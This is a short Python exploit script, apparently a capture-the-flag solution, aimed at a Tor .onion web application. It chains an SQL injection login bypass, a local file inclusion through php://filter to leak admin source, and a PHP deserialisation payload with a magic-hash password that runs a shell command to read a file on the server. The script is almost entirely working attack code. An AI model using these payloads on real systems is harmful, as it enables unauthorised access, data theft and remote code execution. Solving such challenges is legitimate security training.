#!/usr/bin/env python

import requests
from pwn import *
from phpserialize import *

target_url = 'http://7y4b2aymlqwmkyuh.onion/'

tor_proxies = {'http': 'socks5://127.0.0.1:9050',}

# sqli injection
logged_in_cookies = requests.post(target_url, proxies=tor_proxies, headers={'Content-Type' : 'application/x-www-form-urlencoded'}, data={'k' : "' or '1'='1"}).cookies


# lfi
# md5('admin') = 21232f297a57a5a743894a0e4a801fc3
admin_src = requests.get(target_url +'?p=php://filter/convert.base64-encode/resource=21232f297a57a5a743894a0e4a801fc3', proxies=tor_proxies, cookies=logged_in_cookies).text


admin_src = admin_src[admin_src.index('<a href="?l">Logout</a>')+len('<a href="?l">Logout</a>'):]
admin_src = admin_src[:admin_src.index('</center>')]
admin_src = admin_src.replace('<br />', '').replace(' ', '').replace('\n', '')
admin_src = b64d(admin_src)


# serialization + magic hash + assert (RCE)
admin_package = b64e(dumps(phpobject('AdminPackage', {'password' : '240610708' , 'leetness' : "system('cat /home/pengu/7b66a8f1be1f9cff0a19aaf28d0e0396');"})))

print requests.get(target_url +'?p=21232f297a57a5a743894a0e4a801fc3', proxies=tor_proxies, params={'a' : admin_package}, cookies=logged_in_cookies).text
